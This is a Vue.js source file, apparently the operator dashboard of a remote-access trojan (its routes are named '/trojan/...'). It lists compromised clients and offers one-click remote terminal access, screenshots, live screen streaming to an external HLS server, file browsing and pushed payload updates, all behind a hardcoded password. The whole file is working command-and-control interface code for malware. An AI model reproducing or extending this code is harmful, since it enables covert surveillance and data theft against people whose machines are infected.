<template>
  <v-container>
    <v-container v-show="!$store.state.clients.verify.show">
      <v-container>
        <v-text-field
          name="name"
          label="输入密码"
          v-model="verify.password"
          type="password"
          @keydown.enter="verifyPassword"
        >
          <template v-slot:append
            ><v-btn outlined @click="verifyPassword">验证</v-btn></template
          >
        </v-text-field>
      </v-container>
    </v-container>
    <v-container v-if="$store.state.clients.verify.show" class="ma-0 pa-0">
      <v-container class="d-flex">
        <p :style="status_style" class="ml-3">{{ server_status }}</p>
        <p v-if="clientArr.length && server_status == '已连接'" class="ml-3">
          连接数:{{ clientArr && clientArr.length ? clientArr.length : 0 }}
        </p>
        <v-spacer></v-spacer>
        <v-menu offset-y>
          <template v-slot:activator="{ on }">
            <v-btn v-on="on"
              >更多<v-icon class="ml-1" small>fa-angle-down</v-icon></v-btn
            >
          </template>
          <v-btn-toggle multiple max="0">
            <v-btn @click="updateAllClients" outlined> 更新所有客户端 </v-btn>
          </v-btn-toggle>
        </v-menu>
      </v-container>
      <v-container>
        <v-alert
          transition="slide-x-transition"
          style="
            position: fixed;
            right: 0;
            z-index: 999;
            bottom: 10px;
            border: 1px white solid;
          "
          dismissible
          close-icon="fa-close"
          v-model="screenshot.show"
          ><v-img
            :src="screenshot.src"
            :aspect-ratio="screenshot.ratio"
            :width="screenshot.width"
            @click="
              screenshot.width == '70vw'
                ? (screenshot.width = '30vw')
                : (screenshot.width = '70vw')
            "
            ><template v-slot:placeholder>
              <v-row class="fill-height ma-0" align="center" justify="center">
                <v-progress-circular
                  indeterminate
                  color="grey lighten-5"
                ></v-progress-circular>
              </v-row> </template></v-img
        ></v-alert>
      </v-container>
      <v-container style="overflow: auto; height: 70vh">
        <v-item-group v-model="selectedIndex">
          <template v-for="i in clientArr">
            <v-item :key="i.id" v-slot="{ toggle }" class="mb-4">
              <v-card
                @click="toggle"
                :class="{ streaming: i.streaming }"
                v-ripple="false"
              >
                <v-card-title>{{ i.id }}</v-card-title>
                <v-card-subtitle>主机名: {{ i.主机名 }}</v-card-subtitle>
                <v-card-subtitle>平台: {{ i.系统版本名 }}</v-card-subtitle>
                <v-container v-if="i.streaming">
                  <!-- <video ref="player">
                    <source :src="'http://home.countree.cn:8765/hls/'+i.id+'.m3u8'">
                  </video> -->
                  <video-player
                    :options="videoOptions"
                    :id="i.id"
                  ></video-player>
                  <!-- <hls-player :id="i.id"></hls-player> -->
                </v-container>
                <v-card-actions>
                  <v-menu offset-y
                    ><template v-slot:activator="{ on }">
                      <v-btn v-on="on">操作</v-btn></template
                    >
                    <v-btn-toggle dense style="overflow: auto">
                      <v-btn dense @click="showClientDetails(i.id)">
                        详细信息
                      </v-btn>
                      <v-btn dense @click="dialog(i.id)">分析</v-btn>
                      <v-btn dense @click="toControlPage(i.id)"> 终端 </v-btn>
                      <v-btn dense @click="getScreenshot(i.id)"> 截图 </v-btn>
                      <v-btn dense @click="toggleVideoCapture(i.id)">
                        推流:{{
                          $myUtils.getClientById(clientArr, i.id)["streaming"]
                            ? "开"
                            : "关"
                        }}
                      </v-btn>
                      <v-btn dense @click="showFileExplorer(i.id)">
                        文件浏览器
                      </v-btn>
                      <v-btn dense @click="updateThisClientCore(i.id)">
                        更新core
                      </v-btn>
                      <v-btn dense @click="updateThisClientUtils(i.id)">
                        更新utils
                      </v-btn>
                    </v-btn-toggle>
                  </v-menu>
                </v-card-actions>
                <v-divider></v-divider>
              </v-card>
            </v-item>
          </template>
        </v-item-group>

        <p v-show="!clientArr.length">列表为空</p>
        <!-- <video-player></video-player> -->
      </v-container>
    </v-container>
  </v-container>
</template>

<script>
import { IoInit, io } from "../../plugins/socketio";
import videoPlayer from "../../components/videoPlayer.vue";

export default {
  name: "clients",
  components: {
    videoPlayer,
    // hlsPlayer
  },
  data() {
    return {
      videoOptions: {
        // autoplay: 'muted',//自动播放
        controls: true, //用户可以与之交互的控件
        // loop:true,//视频一结束就重新开始
        // muted:false,//默认情况下将使所有音频静音
        // aspectRatio:"16:9",//显示比率
        // fullscreen:{
        // options: {navigationUI: 'hide'}
        // },
        sources: [
          {
            // src: require("@/assets/video/index/oceans.mp4"),
            // type: "video/mp4"
            src: "",
            type: "application/x-mpegURL",
          },
        ],
      },
      verify: {
        password: "",
        show: false,
      },
      clientArr: [],
      selectedId: "",
      selectedIndex: null,
      interval: null,
      server_status: "未连接",
      newBackendName: "backend",
      screenshot: {
        show: false,
        src: "",
        ratio: 16 / 9,
        width: "30vw",
      },
      streamingId: "",
      player: null,
      contextMenu: {
        template: [
          {
            label: "显示此客户端详细信息",
            click: () => {
              for (let i = 0; i < window.clientArr.length; i++) {
                if (window.clientArr[i].id === this.msg.id) {
                  let str = "";
                  for (let item in window.clientArr[i]) {
                    str += `${item}: ${window.clientArr[i][item]}\n`;
                  }
                  alert(str);
                  break;
                }
              }
            },
          },
          {
            label: "打开文件浏览器",
            click: () => {
              console.log(this.msg.id);
              io.emit("apilistdir", this.msg.id, ".");
              this.$router.push({
                path: `/trojan/fileexplorer`,
                query: {
                  id: this.msg.id,
                },
              });
            },
          },
          {
            label: "获取此客户端屏幕截图",
            click: () => {
              io.emit("apigetscreenshot", this.msg.id);
            },
          },
          {
            label: "开启此客户端屏幕推流",
            click: () => {
              io.emit("apistartvideocapture", this.msg.id);
            },
          },
          // { type: "separator" },
          {
            label: "更新此客户端",
            click: () => {
              io.emit("apiupdatethisclient", this.msg.id, "backend");
            },
          },
          // { label: "Menu Item 2", type: "checkbox", checked: true },
        ],
        show: false,
        mousePos: {
          screenX: 0,
          screenY: 0,
          clientX: 0,
          clientY: 0,
        },
      },
    };
  },
  computed: {
    status_style() {
      let tmp = {};
      switch (this.server_status) {
        case "已连接": {
          tmp = { color: "green" };
          break;
        }
        case "未连接":
        case "已断开": {
          tmp = { color: "red" };
        }
      }
      return tmp;
    },
  },
  watch: {
    selectedIndex: {
      handler(nv, ov) {
        if (nv == undefined) {
          this.selectedId = "";
          return;
        }
        this.selectedId = this.clientArr[nv].id;
      },
    },
    streamingId: {
      handler(nv, ov) {
        if (nv !== "") {
          this.$nextTick(() => {
            // this.player = videojs(this.$refs.player)
          });
        } else {
          this.player = null;
        }
      },
    },
  },
  beforeMount() {
    IoInit(this);
    document.documentElement.addEventListener("keydown", (e) => {
      if (e.key == "ArrowDown" && e.ctrlKey) {
        this.$store.state.clients.verify.show =
          !this.$store.state.clients.verify.show;
      }
      // if (e.key == "ArrowUp") {
      // }
    });
    document.documentElement.addEventListener("contextmenu", function (e) {
      e.preventDefault();
    });

    // window.clientArr = [];
    window.cmdResult = {
      data: "",
      changed: false,
    };

    window.cmdResult = new Proxy(window.cmdResult, {
      get(target, key) {
        return target[key];
      },
      set(target, key, value) {
        target[key] = value;
        //监听data改变
        if (key == "data") {
          window.cmdResult.changed = true;
        }
        return true;
      },
    });

    // if (!this.$store.state.io) {
    //   this.$store.state.io = sio.connect(`${SERVER_ADDRESS}:${SERVER_PORT}`, {
    //     // withCredentials: true,
    //   });
    //   this.$store.state.ss = ss;

    //   this.$store.state.io.on("connect", () => {
    //     this.$store.state.io.send({ admin: true });
    //     this.server_status = "已连接";
    //   });

    //   this.$store.state.io.on("disconnect", () => {
    //     this.server_status = "已断开";
    //     this.clientArr = [];
    //   });

    //   this.$store.state.io.on("apigetallclients", (carr) => {
    //     this.clientArr = carr;
    //     this.server_status = "已连接";
    //   });

    //   this.$store.state.io.on("apisendcmd", (cmdresult) => {
    //     window.cmdResult.data = cmdresult.data;
    //     console.log(cmdresult);
    //   });

    //   this.$store.state.io.on("apigetscreenshot", (imgbase64) => {
    //     this.screenshot.src = `data:image/jpg;base64,${imgbase64}`;
    //     this.screenshot.show = true;
    //   });

    //   this.$store.state.io.on("apidialog", (dialogContent) => {
    //     this.$store.commit("setGlobalStatus", "dx分析完毕");
    //     console.log(dialogContent);
    //   });

    //   this.$store.state.io.on("debug", (msg) => {
    //     console.log(`--DEBUG:\n${msg}`);
    //   });
    // }

    //先一秒后五秒获取服务器数据,以优化输入密码时造成的不流畅现象
    this.interval = setInterval(() => {
      //!!
      io.emit("apigetallclients");
      window.clientArr = this.clientArr;
      this.$forceUpdate();
    }, 1000);

    let tmp = this.interval;
    setTimeout(() => {
      clearInterval(tmp);
      tmp = null;
      this.interval = setInterval(() => {
        //!!
        io.emit("apigetallclients");

        window.clientArr = this.clientArr;
        this.$forceUpdate();
      }, 5000);
    }, 2000);

    // ipcRenderer.on("showFileExplorer", (e, id) => {
    //   window.io.emit("apilistdir", id, ".");
    //   that.$router.push({
    //     path: `/trojan/fileexplorer`,
    //     query: {
    //       id: id,
    //     },
    //   });
    // });
    // ipcRenderer.on("startVideoCapture", (e, id) => {
    //   window.io.emit("apistartvideocapture", id);
    // });
  },
  methods: {
    verifyPassword() {
      if (this.verify.password == "52013140") {
        this.$store.state.clients.verify.show = true;
      } else {
        alert("Password wrong!");
      }
    },
    toControlPage(id) {
      this.$router.push("/trojan/control/" + id);
    },
    showClientDetails(id) {
      for (let i = 0; i < this.clientArr.length; i++) {
        if (this.clientArr[i].id === id) {
          let str = "";
          for (let item in this.clientArr[i]) {
            str += `${item}: ${this.clientArr[i][item]}\n`;
          }
          alert(str);
          break;
        }
      }
    },
    getScreenshot(id) {
      this.screenshot.src = null;
      io.emit("apigetscreenshot", id);
    },
    updateThisClient(id) {
      io.emit("apiupdatethisclient", id, "serviceCore.zip");
    },
    updateThisClientCore(id) {
      io.emit("apiupdatethisclientcore", id, "serviceCore.zip");
    },
    updateThisClientUtils(id) {
      io.emit("apiupdatethisclientutils", id, "utils.zip");
    },
    showContextMenu(event, id) {
      // window.ipcRenderer.send("show-context-menu", {
      //   id: id,
      //   newBackendName: this.newBackendName,
      // });

      event = event || window.event;

      // this.$store.state.contextMenu.show = !this.$store.state.contextMenu.show;
      this.$store.state.contextMenu.show = true;
      this.$store.state.contextMenu.mousePos.screenX = event.screenX;
      this.$store.state.contextMenu.mousePos.screenY = event.screenY;
      this.$store.state.contextMenu.mousePos.clientX = event.clientX;
      this.$store.state.contextMenu.mousePos.clientY = event.clientY;
      this.msg.id = id;
      if (this.selectedId == id) {
        this.selectedId = "";
      } else {
        this.selectedId = id;
      }
    },
    updateAllClients() {
      io.emit("apiupdateallclients", this.newBackendName);
    },
    toggleVideoCapture(id) {
      const streaming = this.$myUtils.getClientById(this.clientArr, id)[
        "streaming"
      ];

      if (streaming) {
        io.emit("apistopvideocapture", id);
        // this.streamingId = id;
        this.videoOptions.sources[0].src = "";
      } else {
        io.emit("apistartvideocapture", id);
        // this.streamingId = "";
        this.videoOptions.sources[0].src = `http://home.countree.cn:8765/hls/${id}.m3u8`;
      }
    },
    stopVideoCapture() {
      for (const item of this.clientArr) {
        if (item["streaming"] || item["id"] == this.selectedId) {
          io.emit("apistopvideocapture", item["id"]);
        }
      }
    },
    startVideoCapture(id) {
      io.emit("apistartvideocapture", id);
    },
    showFileExplorer(id) {
      // io.emit("apilistdir", id, ".");
      this.$router.push({
        path: `/trojan/fileexplorer`,
        query: {
          id: id,
        },
      });
    },
    dialog(selectedId) {
      io.emit("apidialog", selectedId);
      this.$store.commit("setGlobalStatus", `正在dx分析中...`);
    },
  },
};
</script>

<style lang="scss">
.streaming {
  animation: streaming infinite alternate 1.5s;
}

.clientselected {
  background-color: rgb(209, 209, 209);
  border: 3px rgb(6, 90, 158) solid !important;
}

@keyframes streaming {
  from {
  }
  to {
    background-color: rgb(47, 85, 47);
  }
}
</style>
